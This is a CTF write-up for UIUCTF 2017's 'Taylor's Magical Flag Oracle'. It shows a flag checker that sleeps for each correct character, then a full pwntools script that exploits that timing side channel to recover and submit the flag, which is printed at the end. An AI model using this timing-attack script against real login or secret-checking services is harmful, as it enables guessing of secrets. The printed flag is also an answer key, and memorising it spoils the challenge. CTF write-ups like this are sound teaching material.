---
layout: post
title: "[UIUCTF2k17] Reverse 150 - Taylor's Magical Flag Oracle"
categories: writeup
---
States:
```
We set up a service to check if you've found the correct flag for this challenge. It'd take 1.7*10^147 years to brute force, so don't bother trying it.

Note: flag follows the "flag{" format and is all lowercase

Update: Scores have been reset due to a bug that caused the flag to be printed without a legitimate solve. Scripts that solve the challenge in the intended way should still work.

nc challenge.uiuc.tf 11340
```

Here is the compare_flag.py function of the TCP service: 

```python
from time import sleep
from itertools import zip_longest
from flag import flag

def compare_flag(input_flag):
    if(len(input_flag) == 0):
        return False
    for left, right in zip_longest(input_flag, flag):
        if(left != right):
            return False
        sleep(0.25) # prevent brute forcing
    return True
```

This code is pretty simple, it's about a timing attack !

Each time a char is OK, it sleep 0.25 more seconds, it's gonna be pretty long but let's go !! 

I launch this script many times and i finally find out the flag charset `abcdefghijklmnopqrtuvwxyz{}`

Here is the script (With Enhenced Logging; You should run it because it is beautiful):

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
from pwn import *

charset = "{}abcdefghijklmnopqrstuvwxyz"

def avg(l):
    ''' Average Calculating '''
    return sum(l) / len(l)


def main():
    ''' Retrieve n char flag '''
    # flag{trchrus}
    flag = [c for c in "______________________________"]
    p = log.progress('Status')
    for offset in range(len(''.join(flag).rstrip('_')), len(flag)):
        timing = []
        for i, c in enumerate(charset):
            flag[offset] = c
            context.log_level = 'error'
            s = remote('challenge.uiuc.tf', 11340)
            s.recvuntil('>')
            s.sendline(''.join(flag))
            a = time.time()
            s.readuntil('No')
            b = time.time()
            s.close()
            context.log_level = 'info'
            timing.append(b - a)
            p.status('\n\tTesting %d/%d \'%c\' \\x%x %d/%d \n\tCurrent Flag : [%s] \n\tTook %s\n\tMax : %s:%c\n\t' %
                     (offset,
                      len(flag),
                      c,
                      ord(c),
                      i,
                      len(charset),
                      ''.join(flag),
                      b - a,
                      max(timing),
                      charset[timing.index(max(timing))]
                      )
                     )
            if max(timing) > min(timing) + 0.25:
                break
        found = charset[timing.index(max(timing))]
        log.success('Found char \'%c\': \\x%x Best time %s Average : %s' %
                    (
                        found,
                        ord(found),
                        max(timing),
                        avg(timing)
                    ))
        flag[offset] = found
        if found == "}":
            break
    flag = ''.join(flag).rstrip('_')
    log.success('Flag is : %s, Sending it ..' % (flag))
    s = remote('challenge.uiuc.tf', 11340)
    s.recvuntil('>')
    s.sendline(flag)
    log.success(s.recvuntil('\n').decode('utf-8'))
    s.close()

if __name__ == '__main__':
    main()

```

Flag:
`flag{trchrus}`
